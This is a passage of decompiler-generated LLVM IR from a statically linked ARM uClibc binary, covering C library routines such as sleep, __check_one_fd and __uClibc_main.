  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_e2b8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e2b8, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_e2c8 = ptrtoint i32* %stack_var_-32 to i32
  %v2_e2cc = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_e2cc, i32* %stack_var_-32, align 4
  br label %dec_label_pc_e2d8

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e2d8, %entry
  %v0_e2ec = phi i32 [ %v1_e2ec, %dec_label_pc_e2d8 ], [ 0, %entry ]
  %v3_e2d8 = phi i32 [ %v1_e2e0, %dec_label_pc_e2d8 ], [ %v2_e2cc, %entry ]
  %v1_e2dc = inttoptr i32 %v3_e2d8 to i32*
  %v2_e2dc = load i32, i32* %v1_e2dc, align 4
  %v1_e2e0 = add i32 %v3_e2d8, 4
  %v2_e2e4 = icmp eq i32 %v2_e2dc, 0
  store i32 %v1_e2e0, i32* %stack_var_-32, align 4
  %v1_e2ec = add i32 %v0_e2ec, 1
  store i32 %v1_e2ec, i32* @lr, align 4
  br i1 %v2_e2e4, label %dec_label_pc_e2f4, label %dec_label_pc_e2d8

dec_label_pc_e2f4:                                ; preds = %dec_label_pc_e2d8
  %v3_e2f4.neg = mul i32 %v1_e2ec, -4
  %v1_e2f8.neg = add i32 %v2_e2c8, -8
  %v2_e2fc = add i32 %v1_e2f8.neg, %v3_e2f4.neg
  %v2_e304 = inttoptr i32 %v2_e2fc to i32*
  store i32 %arg1, i32* %v2_e304, align 4
  store i32 %v2_e2cc, i32* %stack_var_-32, align 4
  %v0_e310 = load i32, i32* @sp, align 4
  store i32 %v0_e310, i32* @r1, align 4
  store i32 %v0_e310, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e318

dec_label_pc_e318:                                ; preds = %dec_label_pc_e318.dec_label_pc_e318_crit_edge, %dec_label_pc_e2f4
  %v1_e32c = phi i32 [ %v5_e32c, %dec_label_pc_e318.dec_label_pc_e318_crit_edge ], [ %v0_e310, %dec_label_pc_e2f4 ]
  %v3_e318 = phi i32 [ %v3_e318.pre, %dec_label_pc_e318.dec_label_pc_e318_crit_edge ], [ %v2_e2cc, %dec_label_pc_e2f4 ]
  %v1_e31c = inttoptr i32 %v3_e318 to i32*
  %v2_e31c = load i32, i32* %v1_e31c, align 4
  %v0_e320 = load i32, i32* @lr, align 4
  %v1_e320 = add i32 %v0_e320, -1
  store i32 %v1_e320, i32* @lr, align 4
  %v7_e320 = icmp eq i32 %v0_e320, 1
  %v1_e324 = add i32 %v3_e318, 4
  store i32 %v1_e324, i32* %stack_var_-32, align 4
  %v2_e32c = add i32 %v1_e32c, 4
  %v3_e32c = inttoptr i32 %v2_e32c to i32*
  store i32 %v2_e31c, i32* %v3_e32c, align 4
  %v4_e32c = load i32, i32* %ip.global-to-local, align 4
  %v5_e32c = add i32 %v4_e32c, 4
  store i32 %v5_e32c, i32* %ip.global-to-local, align 4
  br i1 %v7_e320, label %dec_label_pc_e334, label %dec_label_pc_e318.dec_label_pc_e318_crit_edge

dec_label_pc_e318.dec_label_pc_e318_crit_edge:    ; preds = %dec_label_pc_e318
  %v3_e318.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_e318

dec_label_pc_e334:                                ; preds = %dec_label_pc_e318
  %v2_e338 = load i32, i32* @global_var_1fe14.619, align 4
  store i32 %v2_e338, i32* @r2, align 4
  %v0_e33c = call i32 @__GI_execve()
  ret i32 %v0_e33c

; uselistorder directives
  uselistorder i32 %v5_e32c, { 1, 0 }
  uselistorder i32 %v0_e320, { 1, 0 }
  uselistorder i32 %v1_e2ec, { 0, 2, 1 }
  uselistorder i32 %v1_e2e0, { 1, 0 }
  uselistorder i32 %v3_e2d8, { 1, 0 }
  uselistorder i32 %v2_e2cc, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_e34c = load i32, i32* @r4, align 4
  store i32 %v3_e34c, i32* %stack_var_-20, align 4
  %v6_e34c = load i32, i32* @r5, align 4
  %v9_e34c = load i32, i32* @r6, align 4
  %v16_e34c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_e350 = icmp eq i32 %arg1, 0
  %v2_e354 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_e350, label %dec_label_pc_e4d8, label %dec_label_pc_e36c.preheader

dec_label_pc_e36c.preheader:                      ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_e37417 = add i32 %v16_e34c, 124
  br label %dec_label_pc_e364

dec_label_pc_e364:                                ; preds = %dec_label_pc_e36c.preheader, %dec_label_pc_e364
  %v5_e37418 = phi i32 [ %v5_e37417, %dec_label_pc_e36c.preheader ], [ %v5_e374, %dec_label_pc_e364 ]
  %v2_e368 = add i32 %v5_e37418, -136
  %v3_e368 = inttoptr i32 %v2_e368 to i32*
  store i32 0, i32* %v3_e368, align 4
  %v0_e36c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_e36c = add i32 %v0_e36c.pre, -1
  store i32 %v1_e36c, i32* %r1.global-to-local, align 4
  %v6_e36c = icmp slt i32 %v1_e36c, 0
  %v4_e374 = mul i32 %v1_e36c, 4
  %v5_e374 = add i32 %v4_e374, %v16_e34c
  br i1 %v6_e36c, label %dec_label_pc_e37c, label %dec_label_pc_e364

dec_label_pc_e37c:                                ; preds = %dec_label_pc_e364
  %v2_e37c = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_e37c, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v0_e38c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_e38c, i32* %stack_var_-28, align 4
  %v2_e394 = call i32 @__sigaddset(i32 %v2_e37c, i32 17)
  store i32 %v2_e394, i32* %r0.global-to-local, align 4
  %v1_e398 = load i32, i32* @r5, align 4
  %v5_e39c = icmp slt i32 %v2_e394, %v1_e398
  br i1 %v5_e39c, label %dec_label_pc_e4e0, label %dec_label_pc_e3a0

dec_label_pc_e3a0:                                ; preds = %dec_label_pc_e37c
  %v2_e3a0 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_e3a0, i32* @r4, align 4
  store i32 %v1_e398, i32* %r0.global-to-local, align 4
  store i32 %v2_e37c, i32* %r1.global-to-local, align 4
  %v3_e3b0 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_e3b0 = call i32 @__GI_sigprocmask(i32 %v1_e398, %_TYPEDEF_sigset_t* %v3_e3b0, i32 %v2_e3a0)
  store i32 %v4_e3b0, i32* %r0.global-to-local, align 4
  %v1_e3b4 = load i32, i32* @r5, align 4
  %v9_e3b4 = icmp eq i32 %v4_e3b0, %v1_e3b4
  br i1 %v9_e3b4, label %dec_label_pc_e3bc, label %dec_label_pc_e4e0

dec_label_pc_e3bc:                                ; preds = %dec_label_pc_e3a0
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_e3a0, i32* %r0.global-to-local, align 4
  %v2_e3c4 = call i32 @__sigismember(i32 %v2_e3a0, i32 17)
  store i32 %v2_e3c4, i32* %r0.global-to-local, align 4
  %v1_e3c8 = load i32, i32* @r5, align 4
  %v9_e3c8 = icmp eq i32 %v2_e3c4, %v1_e3c8
  br i1 %v9_e3c8, label %dec_label_pc_e3e0.preheader, label %dec_label_pc_e3bc.dec_label_pc_e4a8_crit_edge

dec_label_pc_e3bc.dec_label_pc_e4a8_crit_edge:    ; preds = %dec_label_pc_e3bc
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_e4a8

dec_label_pc_e3e0.preheader:                      ; preds = %dec_label_pc_e3bc
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e3d8

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e3e0.preheader, %dec_label_pc_e3d8
  %v5_e3e816 = phi i32 [ %v5_e37417, %dec_label_pc_e3e0.preheader ], [ %v5_e3e8, %dec_label_pc_e3d8 ]
  %v2_e3dc = add i32 %v5_e3e816, -136
  %v3_e3dc = inttoptr i32 %v2_e3dc to i32*
  store i32 0, i32* %v3_e3dc, align 4
  %v0_e3e0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_e3e0 = add i32 %v0_e3e0.pre, -1
  store i32 %v1_e3e0, i32* %r1.global-to-local, align 4
  %v6_e3e0 = icmp slt i32 %v1_e3e0, 0
  %v4_e3e8 = mul i32 %v1_e3e0, 4
  %v5_e3e8 = add i32 %v4_e3e8, %v16_e34c
  br i1 %v6_e3e0, label %dec_label_pc_e3f0, label %dec_label_pc_e3d8

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3d8
  store i32 %v2_e37c, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v2_e3f8 = call i32 @__sigaddset(i32 %v2_e37c, i32 17)
  store i32 %v2_e3f8, i32* %r0.global-to-local, align 4
  %v1_e3fc = icmp slt i32 %v2_e3f8, 0
  br i1 %v1_e3fc, label %dec_label_pc_e4e0, label %dec_label_pc_e404

dec_label_pc_e404:                                ; preds = %dec_label_pc_e3f0
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_e410 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_e354)
  store i32 %v4_e410, i32* %r0.global-to-local, align 4
  %v1_e414 = icmp slt i32 %v4_e410, 0
  br i1 %v1_e414, label %dec_label_pc_e41c, label %dec_label_pc_e444

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e404
  %v0_e41c = call i32 @__errno_location()
  store i32 %v2_e3a0, i32* %r1.global-to-local, align 4
  store i32 %v0_e41c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_e430 = inttoptr i32 %v0_e41c to i32*
  %v2_e430 = load i32, i32* %v1_e430, align 4
  store i32 %v2_e430, i32* @r4, align 4
  %v3_e434 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_e434 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_e434, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_e43c = load i32, i32* @r4, align 4
  %v1_e43c = load i32, i32* %r5.global-to-local, align 4
  %v2_e43c = inttoptr i32 %v1_e43c to i32*
  store i32 %v0_e43c, i32* %v2_e43c, align 4
  %v17_e4e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e4

dec_label_pc_e444:                                ; preds = %dec_label_pc_e404
  %v2_e444 = load i32, i32* %stack_var_-424, align 4
  %v7_e448 = icmp eq i32 %v2_e444, 1
  %v2_e450 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_e450, i32* @r4, align 4
  br i1 %v7_e448, label %dec_label_pc_e458, label %dec_label_pc_e48c

dec_label_pc_e458:                                ; preds = %dec_label_pc_e444
  store i32 %v2_e450, i32* %r1.global-to-local, align 4
  store i32 %v2_e450, i32* %r0.global-to-local, align 4
  %v2_e460 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_e460 = call i32 @__libc_nanosleep(%timespec* %v2_e460, i32 %v2_e450)
  store i32 %v3_e460, i32* %r0.global-to-local, align 4
  store i32 %v3_e460, i32* %r6.global-to-local, align 4
  %v0_e468 = call i32 @__errno_location()
  store i32 %v2_e3a0, i32* %r1.global-to-local, align 4
  store i32 %v0_e468, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_e47c = inttoptr i32 %v0_e468 to i32*
  %v2_e47c = load i32, i32* %v1_e47c, align 4
  store i32 %v2_e47c, i32* @r4, align 4
  %v3_e480 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_e480 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_e480, i32 0)
  store i32 %v4_e480, i32* %r0.global-to-local, align 4
  %v0_e484 = load i32, i32* @r4, align 4
  %v1_e484 = load i32, i32* %r5.global-to-local, align 4
  %v2_e484 = inttoptr i32 %v1_e484 to i32*
  store i32 %v0_e484, i32* %v2_e484, align 4
  %v0_e4b4.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4b4

dec_label_pc_e48c:                                ; preds = %dec_label_pc_e444
  store i32 %v2_e3a0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_e498 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_e498 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_e498, i32 0)
  store i32 %v4_e498, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e3bc.dec_label_pc_e4a8_crit_edge, %dec_label_pc_e48c
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_e3bc.dec_label_pc_e4a8_crit_edge ], [ %v2_e450, %dec_label_pc_e48c ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_e4ac = bitcast i32* %stack_var_-28 to %timespec*
  %v3_e4ac = call i32 @__libc_nanosleep(%timespec* %v2_e4ac, i32 %storemerge.pre-phi)
  store i32 %v3_e4ac, i32* %r0.global-to-local, align 4
  store i32 %v3_e4ac, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4b4

dec_label_pc_e4b4:                                ; preds = %dec_label_pc_e458, %dec_label_pc_e4a8
  %v0_e4b4 = phi i32 [ %v0_e4b4.pr, %dec_label_pc_e458 ], [ %v3_e4ac, %dec_label_pc_e4a8 ]
  %v2_e4b4 = icmp eq i32 %v0_e4b4, 0
  br i1 %v2_e4b4, label %dec_label_pc_e4d8, label %dec_label_pc_e4bc

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_e4b4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e4c4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_e4c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e4

dec_label_pc_e4d8:                                ; preds = %entry, %dec_label_pc_e4b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e4

dec_label_pc_e4e0:                                ; preds = %dec_label_pc_e3a0, %dec_label_pc_e3f0, %dec_label_pc_e37c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e4

dec_label_pc_e4e4:                                ; preds = %dec_label_pc_e4bc, %dec_label_pc_e4d8, %dec_label_pc_e41c, %dec_label_pc_e4e0
  %v17_e4e8 = phi i32 [ %v3_e4c4, %dec_label_pc_e4bc ], [ 0, %dec_label_pc_e4d8 ], [ %v17_e4e8.pre, %dec_label_pc_e41c ], [ -1, %dec_label_pc_e4e0 ]
  %v2_e4e8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_e4e8, i32* @r4, align 4
  store i32 %v6_e34c, i32* @r5, align 4
  store i32 %v9_e34c, i32* @r6, align 4
  ret i32 %v17_e4e8

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_e450, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_e3e0, { 0, 2, 1 }
  uselistorder i32 %v2_e3a0, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_e398, { 1, 0, 2 }
  uselistorder i32 %v2_e37c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_e36c, { 0, 2, 1 }
  uselistorder i32 %v16_e34c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 1, 12, 13, 14, 16, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 18, 17, 20, 19, 22, 21, 24, 23, 1 }
  uselistorder label %dec_label_pc_e4e4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_e4e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e4d8, { 1, 0 }
  uselistorder label %dec_label_pc_e4b4, { 1, 0 }
  uselistorder label %dec_label_pc_e4a8, { 1, 0 }
  uselistorder label %dec_label_pc_e3d8, { 1, 0 }
  uselistorder label %dec_label_pc_e364, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_e51c:
  %stack_var_-8 = alloca i32, align 4
  %v3_e4f0 = load i32, i32* @r4, align 4
  store i32 %v3_e4f0, i32* %stack_var_-8, align 4
  %v2_e520 = load i32, i32* @global_var_1fe1c.625, align 4
  %v2_e524 = icmp eq i32 %v2_e520, 0
  br i1 %v2_e524, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e51c
  call void @__pseudo_branch(i32 %v2_e520)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e51c, %bb
  %v2_e534 = load i32, i32* @global_var_1fe20.627, align 4
  %v2_e538 = icmp eq i32 %v2_e534, 0
  br i1 %v2_e538, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_e53c = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_e53c, i32* @r4, align 4
  %v9_e53c = load i32, i32* @r0, align 4
  ret i32 %v9_e53c

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_e534)
  %v2_e548 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e548, i32* @r4, align 4
  %v8_e548 = load i32, i32* @r0, align 4
  ret i32 %v8_e548

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_e564 = load i32, i32* @r0, align 4
  ret i32 %v1_e564
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_e568 = load i32, i32* @r4, align 4
  store i32 %v3_e568, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_e578 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_e57c = icmp eq i32 %v2_e578, -1
  br i1 %v7_e57c, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_e580 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_e580, i32* @r4, align 4
  ret i32 %v2_e578

bb4:                                              ; preds = %entry
  %v0_e584 = load i32, i32* @r4, align 4
  %v4_e58c = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_14360.630, i32 0, i32 0), i32 %v0_e584)
  %v1_e590 = load i32, i32* %r5.global-to-local, align 4
  %v9_e590 = icmp eq i32 %v4_e58c, %v1_e590
  br i1 %v9_e590, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_e594 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_e594, i32* @r4, align 4
  ret i32 %v4_e58c

bb6:                                              ; preds = %bb4
  %v0_e598 = call i32 @abort()
  %v0_e59c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e59c, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v3_e59c = udiv i32 %v0_e598, 64
  %v4_e59c = mul i32 %v0_e598, 67108864
  %v5_e59c = or i32 %v3_e59c, %v4_e59c
  %v8_e59c = and i32 %v5_e59c, %v0_e584
  store i32 %v8_e59c, i32* @r4, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_e598

; uselistorder directives
  uselistorder i32 %v0_e598, { 2, 0, 1 }
  uselistorder i32 %v2_e578, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e5a4 = load i32, i32* @global_var_1fe24.632, align 4
  %v2_e5a8 = icmp eq i32 %v2_e5a4, 0
  br i1 %v2_e5a8, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_e5b4 = load i32, i32* @r0, align 4
  ret i32 %v6_e5b4

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_1fe24.632, align 4
  store i32 4096, i32* @global_var_1fe18.395, align 4
  %v0_e5e8 = call i32 @_stdio_init()
  ret i32 %v0_e5e8
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_e600 = mul i32 %arg2, 4
  %v5_e600 = add i32 %tmp, %v4_e600
  %v2_e604 = load i32, i32* %arg3, align 4
  %v2_e608 = ptrtoint i32* %stack_var_-120 to i32
  %v1_e60c = add i32 %v5_e600, 4
  store i32 %v1_e60c, i32* @ip, align 4
  %v9_e610 = icmp eq i32 %v1_e60c, %v2_e604
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_1fe10.638, align 4
  store i32 %v1_e60c, i32* @global_var_1fe14.619, align 4
  store i32 %arg6, i32* @global_var_1fe20.627, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_e610, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_e600, i32* @global_var_1fe14.619, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_e650 = bitcast i32* %stack_var_-120 to i8*
  %v3_e650 = call i32 @__GI_memset(i8* %v2_e650, i32 0)
  %storemerge.pre = load i32, i32* @global_var_1fe14.619, align 4
  br label %dec_label_pc_e660

dec_label_pc_e660:                                ; preds = %dec_label_pc_e660, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_e660, %dec_label_pc_e660 ]
  %v1_e660 = inttoptr i32 %storemerge to i32*
  %v2_e660 = load i32, i32* %v1_e660, align 4
  %v4_e660 = add i32 %storemerge, 4
  %v2_e664 = icmp eq i32 %v2_e660, 0
  br i1 %v2_e664, label %dec_label_pc_e670, label %dec_label_pc_e660

dec_label_pc_e670:                                ; preds = %dec_label_pc_e660
  store i32 %v4_e660, i32* @r4, align 4
  %v1_e69022 = inttoptr i32 %v4_e660 to i32*
  %v2_e69023 = load i32, i32* %v1_e69022, align 4
  %v2_e69425 = icmp eq i32 %v2_e69023, 0
  br i1 %v2_e69425, label %dec_label_pc_e69c, label %dec_label_pc_e678

dec_label_pc_e678:                                ; preds = %dec_label_pc_e670, %dec_label_pc_e690
  %v5_e67c = phi i32 [ %v2_e690, %dec_label_pc_e690 ], [ %v2_e69023, %dec_label_pc_e670 ]
  %v2_e678 = icmp ugt i32 %v5_e67c, 13
  %v7_e678 = icmp eq i32 %v5_e67c, 14
  %v2_e67c = xor i1 %v2_e678, true
  %v3_e67c = or i1 %v7_e678, %v2_e67c
  br i1 %v3_e67c, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_e678
  %v6_e67c = and i32 %v5_e67c, 536870912
  %v7_e67c = icmp ne i32 %v6_e67c, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_e678, %bb42
  %v1_e688 = phi i1 [ %v2_e678, %dec_label_pc_e678 ], [ %v7_e67c, %bb42 ]
  %v2_e680 = xor i1 %v1_e688, true
  %v3_e680 = or i1 %v7_e678, %v2_e680
  br i1 %v3_e680, label %bb44, label %dec_label_pc_e690

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_e680, i32 ptrtoint (i32* @global_var_c850.641 to i32))
  %v0_e68c = load i32, i32* @r4, align 4
  %v1_e68c = add i32 %v0_e68c, 8
  store i32 %v1_e68c, i32* @r4, align 4
  %v1_e690 = inttoptr i32 %v1_e68c to i32*
  %v2_e690 = load i32, i32* %v1_e690, align 4
  %v2_e694 = icmp eq i32 %v2_e690, 0
  br i1 %v2_e694, label %dec_label_pc_e69c, label %dec_label_pc_e678

dec_label_pc_e69c:                                ; preds = %dec_label_pc_e690, %dec_label_pc_e670
  %v1_e6a0 = call i32 @_dl_aux_init(i32 %v2_e608)
  store i32 %v1_e6a0, i32* @r0, align 4
  %v1_e6a4 = call i32 @__GI___uClibc_init(i32 %v1_e6a0)
  store i32 %v1_e6a4, i32* @r0, align 4
  %v2_e6b0 = icmp eq i32 %tmp37, 0
  br i1 %v2_e6b0, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_e69c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_e69c, %bb45
  %v0_e6c0 = phi i32 [ %tmp37, %dec_label_pc_e69c ], [ 4096, %bb45 ]
  %v3_e6b8 = icmp eq i32 %tmp36, -1
  %v8_e6b8 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_1fe18.395 to i32), i32* @r2, align 4
  store i32 %v0_e6c0, i32* @global_var_1fe18.395, align 4
  br i1 %v3_e6b8, label %dec_label_pc_e6c8, label %dec_label_pc_e6f0

dec_label_pc_e6c8:                                ; preds = %bb46
  %v0_e6c8 = call i32 @getuid()
  store i32 %v0_e6c8, i32* @r0, align 4
  store i32 %v0_e6c8, i32* @r4, align 4
  %v0_e6d0 = call i32 @geteuid()
  %v0_e6d4 = load i32, i32* @r4, align 4
  %v9_e6d4 = icmp eq i32 %v0_e6d4, %v0_e6d0
  br i1 %v9_e6d4, label %dec_label_pc_e6dc, label %dec_label_pc_e718

dec_label_pc_e6dc:                                ; preds = %dec_label_pc_e6c8
  %v1_e6dc = call i32 @getgid(i32 %v0_e6d0)
  store i32 %v1_e6dc, i32* @r0, align 4
  store i32 %v1_e6dc, i32* @r4, align 4
  %v0_e6e4 = call i32 @getegid()
  %v0_e6e8 = load i32, i32* @r4, align 4
  %v9_e6e8 = icmp eq i32 %v0_e6e8, %v0_e6e4
  br i1 %v9_e6e8, label %dec_label_pc_e6f0, label %dec_label_pc_e718

dec_label_pc_e6f0:                                ; preds = %dec_label_pc_e6dc, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_e6b8, label %dec_label_pc_e784, label %dec_label_pc_e6fc

dec_label_pc_e6fc:                                ; preds = %dec_label_pc_e6f0
  %v9_e700 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_e700, label %dec_label_pc_e708, label %dec_label_pc_e718

dec_label_pc_e708:                                ; preds = %dec_label_pc_e6fc
  br label %dec_label_pc_e718

dec_label_pc_e718:                                ; preds = %dec_label_pc_e708, %dec_label_pc_e6fc, %dec_label_pc_e6dc, %dec_label_pc_e6c8
  %v2_e720 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_e72c = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_e738 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_e784

dec_label_pc_e784:                                ; preds = %dec_label_pc_e718, %dec_label_pc_e6f0
  %v0_e748 = load i32, i32* @r6, align 4
  %v1_e748 = inttoptr i32 %v0_e748 to i32*
  %v2_e748 = load i32, i32* %v1_e748, align 4
  store i32 %v2_e748, i32* @global_var_1d79c, align 4
  store i32 %arg5, i32* @global_var_1fe1c.625, align 4
  %v2_e784 = icmp eq i32 %arg4, 0
  br i1 %v2_e784, label %dec_label_pc_e7c0, label %bb47

bb47:                                             ; preds = %dec_label_pc_e784
  br label %dec_label_pc_e7c0

dec_label_pc_e7c0:                                ; preds = %dec_label_pc_e784, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_e7d0 = call i32 @__errno_location()
  %v2_e7d8 = inttoptr i32 %v1_e7d0 to i32*
  store i32 0, i32* %v2_e7d8, align 4
  %v1_e7ec = call i32 @__GI___h_errno_location()
  %v2_e7f4 = inttoptr i32 %v1_e7ec to i32*
  store i32 0, i32* %v2_e7f4, align 4
  %v0_e804 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_e810 = call i32 @__GI_exit(i32 %v0_e804)
  ret i32 %v1_e810

; uselistorder directives
  uselistorder i32 %v2_e690, { 1, 0 }
  uselistorder i32 %v1_e68c, { 1, 0 }
  uselistorder i1 %v2_e678, { 1, 0 }
